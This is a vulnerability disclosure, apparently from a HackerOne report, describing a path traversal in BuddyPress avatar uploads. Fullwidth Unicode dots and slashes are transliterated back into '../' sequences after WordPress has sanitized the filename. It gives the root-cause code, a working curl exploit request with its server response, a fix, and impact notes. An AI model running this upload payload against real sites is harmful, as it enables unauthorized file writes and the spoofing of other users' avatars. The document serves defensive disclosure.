## TL;DR
WordPress sanitizes uploaded filenames and strips `../` traversal sequences before BuddyPress ever sees them. BuddyPress then runs a second transliteration pass to convert Unicode characters to ASCII — but that same pass silently converts fullwidth Unicode lookalikes (`．` U+FF0E, `／` U+FF0F) back into real ASCII `.` and `/`, reconstructing the very traversal sequences WordPress just removed.

Any authenticated member can upload an avatar with a crafted Unicode filename and land the file at an arbitrary writable path outside their own avatar folder. The server even discloses the traversed path in its own JSON response.

**One avatar upload. Arbitrary filesystem write. No admin needed.**

## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |

## Description
WordPress strips slashes and `..` sequences from an uploaded filename before it's used to build a destination path. BuddyPress then runs the already-sanitized name through an additional transliteration step meant to turn accented Unicode characters into plain ASCII — but that same transliteration also converts certain fullwidth Unicode lookalikes of `.` and `/` into real ASCII `.` and `/`, silently re-introducing the traversal sequence WordPress had just removed. A member uploading their own avatar can use this to write a file to an arbitrary writable location outside their avatar folder.

## Root Cause

- File: `bp-core/classes/class-bp-attachment.php:297-322`
- Vulnerable code:

```php
public function sanitize_utf8_filename( $retval ) {
    if ( function_exists( 'transliterator_transliterate' ) && ... ) {
        $retval = transliterator_transliterate( 'Any-Latin; Latin-ASCII; [\u0080-\u7fff] remove', $retval );
    }
    ...
    return $retval;
}
```

Registered as a `sanitize_file_name` filter, so it runs on the output of WordPress's own `sanitize_file_name()` — after traversal characters have already been stripped once.

- Why it's wrong: the ICU transliteration rule converts fullwidth Unicode punctuation (e.g. `．` U+FF0E, `／` U+FF0F) into ordinary ASCII `.` and `/`, which can reconstruct `../` sequences that survived WordPress's sanitizer precisely because they weren't ASCII dots/slashes at that point.

## Steps to Reproduce

**Privilege level:** ordinary authenticated member (`attacker`, subscriber) uploading their own avatar — no elevated privilege of any kind.

---

**Step 1 — Prepare the crafted filename**

Use a real, valid JPEG whose filename is composed entirely of fullwidth Unicode dot/slash characters (`．．／．．／．．／pwn.jpg` — U+FF0E U+FF0E U+FF0F repeated). WordPress's sanitizer passes these through untouched because they are not ASCII `.` or `/`.

---

**Step 2 — Upload the avatar and observe the traversed path in the response**

Read the `bp-uploader` nonce and `bp_params` from the "Change Profile Photo" page, then submit:

```bash
curl -s -i -b attacker_cookies.txt -X POST "http://127.0.0.1:8977/wp-admin/admin-ajax.php" \
  -F "action=bp_avatar_upload" \
  -F "_wpnonce=fe8b79defc" \
  -F "bp_params[object]=user" \
  -F "bp_params[item_id]=2" \
  -F "file=@tiny.jpg;filename=．．／．．／．．／pwn.jpg;type=image/jpeg"
```

```json
HTTP/1.1 200 OK
{"success":true,"data":{"name":"．．／．．／．．／pwn",
"url":"http://127.0.0.1:8977/wp-content/uploads/avatars/2/../../../pwn.jpg",
"width":1,"height":1,"feedback":"You have selected an image that is smaller than recommended..."}}
```

The server's own `url` field discloses the traversed path — `avatars/2/../../../pwn.jpg` — proving the transliteration reconstructed the `../` sequences server-side.

---

**Step 3 — Confirm the file landed outside the avatar directory**

```bash
curl -s -o /dev/null -w "HTTP %{http_code}, size %{size_download} bytes\n" \
  "http://127.0.0.1:8977/wp-content/pwn.jpg"
```

```
HTTP 200, size 287 bytes
```

The file is now served directly from `wp-content/` — three levels above the intended avatar folder — with no filesystem access used at any point beyond the single upload request.

## Recommendation
In `BP_Attachment::sanitize_utf8_filename()`, run the transliterated result back through `sanitize_file_name()` (or `wp_basename()` plus an explicit strip of `.`/`/`/`\`) before returning it, so the filter can never re-introduce what WordPress's own sanitizer had already removed.

## Impact
Any authenticated member — the same privilege level needed to upload a normal avatar — can create an attacker-chosen, image-wrapped file at an arbitrary writable filesystem location outside their own avatar directory, up to and including outside `wp-content/uploads/` entirely, as demonstrated by landing the file directly in `wp-content/`. The file content must pass image-type validation (a real JPEG/PNG/GIF/WEBP), so this is not a direct route to a PHP webshell, but it is arbitrary-location file creation and can overwrite or spoof avatar files belonging to other users or groups by targeting their avatar directories instead. No admin cooperation is needed. This requires the PHP `intl` extension (`ext-intl`), which is common but not universal.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
